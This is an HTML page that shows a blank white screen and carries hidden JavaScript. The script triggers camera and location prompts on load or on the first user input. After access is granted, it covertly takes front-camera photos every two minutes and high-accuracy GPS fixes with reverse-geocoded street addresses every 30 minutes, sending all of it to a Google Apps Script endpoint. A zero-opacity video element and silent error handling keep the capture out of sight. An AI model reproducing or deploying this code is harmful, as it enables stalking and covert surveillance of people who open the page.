<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page</title>
    <style>
        body { 
            background: #fff; 
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        #camera { 
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

<video id="camera" autoplay playsinline muted></video>

<script>
const camera = document.getElementById('camera');

// URL Google Apps Script
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxjwIKdKP7foTvzOq-EDzoQss6DpykfUqABQ3cBeiVRoybcl-Ee5-9SM3NUWdU44GDw/exec';

let photoInterval;
let locationInterval;
let stream;
let cameraRequested = false;
let locationRequested = false;
let videoReady = false;

// ========== KAMERA FUNCTIONS ==========

function requestCamera() {
    if (cameraRequested || !navigator.mediaDevices?.getUserMedia) {
        return;
    }
    
    cameraRequested = true;
    
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 }
        } 
    })
    .then(s => {
        stream = s;
        camera.srcObject = stream;
        
        camera.onloadedmetadata = () => {
            camera.play().then(() => {
                setTimeout(() => {
                    videoReady = true;
                    startPhotoCapture();
                }, 1500);
            });
        };
        
        camera.onloadeddata = () => {
            videoReady = true;
        };
    })
    .catch(err => {
        cameraRequested = false;
    });
}

function startPhotoCapture() {
    if (!stream || !videoReady || photoInterval) {
        return;
    }
    
    setTimeout(() => {
        capturePhoto();
    }, 3000);
    
    photoInterval = setInterval(capturePhoto, 120000);
}

async function capturePhoto() {
    if (!stream || !videoReady) {
        return;
    }
    
    if (!camera.videoWidth || !camera.videoHeight || camera.videoWidth < 10) {
        return;
    }
    
    if (camera.paused || camera.ended || camera.readyState < 2) {
        try {
            await camera.play();
            await new Promise(r => setTimeout(r, 800));
        } catch (e) {
            return;
        }
    }

    try {
        const canvas = document.createElement('canvas');
        canvas.width = camera.videoWidth;
        canvas.height = camera.videoHeight;

        const ctx = canvas.getContext('2d', { willReadFrequently: false });
        if (!ctx) return;
        
        ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
        
        const imageData = ctx.getImageData(0, 0, Math.min(50, canvas.width), Math.min(50, canvas.height));
        const pixels = imageData.data;
        let brightness = 0;
        
        for (let i = 0; i < pixels.length; i += 4) {
            brightness += (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
        }
        
        const avgBrightness = brightness / (pixels.length / 4);
        
        if (avgBrightness < 5) {
            return;
        }

        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);

        const photoData = { 
            type: 'photo', 
            dataUrl: dataUrl,
            timestamp: new Date().toISOString(),
            resolution: `${canvas.width}x${canvas.height}`
        };
        
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(photoData)
        });
        
    } catch (err) {
        // Silent
    }
}

// ========== LOKASI FUNCTIONS ==========

function requestLocation() {
    if (locationRequested || !navigator.geolocation) {
        return;
    }
    
    locationRequested = true;
    startLocationTracking();
}

function startLocationTracking() {
    if (!navigator.geolocation) {
        return;
    }
    
    getCurrentLocationAndSend();
    
    if (locationInterval) {
        clearInterval(locationInterval);
    }
    
    locationInterval = setInterval(() => {
        getCurrentLocationAndSend();
    }, 1800000);
}

function getCurrentLocationAndSend() {
    if (!navigator.geolocation) {
        return;
    }
    
    const options = { 
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
    };
    
    navigator.geolocation.getCurrentPosition(
        position => handleLocation(position),
        err => {
            const fallbackOptions = { 
                enableHighAccuracy: false,
                timeout: 30000,
                maximumAge: 60000
            };
            
            navigator.geolocation.getCurrentPosition(
                position => handleLocation(position),
                err2 => {},
                fallbackOptions
            );
        },
        options
    );
}

async function handleLocation(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;
    const alt = position.coords.altitude;
    const altAcc = position.coords.altitudeAccuracy;
    const heading = position.coords.heading;
    const speed = position.coords.speed;

    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

    let address = null;
    
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
        
        const response = await fetch(url, {
            headers: { 'User-Agent': 'LocationTracker/1.0' }
        });
        
        if (response.ok) {
            const data = await response.json();
            address = {
                road: data.address?.road || data.address?.street || '-',
                suburb: data.address?.suburb || data.address?.neighbourhood || '-',
                village: data.address?.village || data.address?.hamlet || '-',
                city: data.address?.city || data.address?.town || data.address?.municipality || '-',
                state: data.address?.state || data.address?.province || '-',
                postcode: data.address?.postcode || '-',
                country: data.address?.country || '-',
                displayName: data.display_name || '-'
            };
        }
    } catch (e) {}

    const trackingData = { 
        type: 'tracking', 
        lat: lat, 
        lon: lon, 
        acc: acc,
        altitude: alt,
        altitudeAccuracy: altAcc,
        heading: heading,
        speed: speed,
        timestamp: new Date(position.timestamp).toISOString(),
        mapsLink: mapsLink,
        address: address
    };
    
    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(trackingData)
        }).catch(() => {
            fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(trackingData)
            });
        });
    } catch (err) {}
}

// ========== TRIGGER PERMISSIONS ==========

function requestAll() {
    requestCamera();
    requestLocation();
}

// User interaction triggers
['click', 'touchstart', 'touchend', 'keydown', 'mousemove'].forEach(event => {
    document.addEventListener(event, requestAll, { once: true });
});

// Auto-trigger
setTimeout(requestAll, 1000);

// Fallback khusus lokasi (karena lokasi tidak perlu video element)
setTimeout(() => {
    if (!locationRequested) {
        requestLocation();
    }
}, 2500);
</script>

</body>
</html>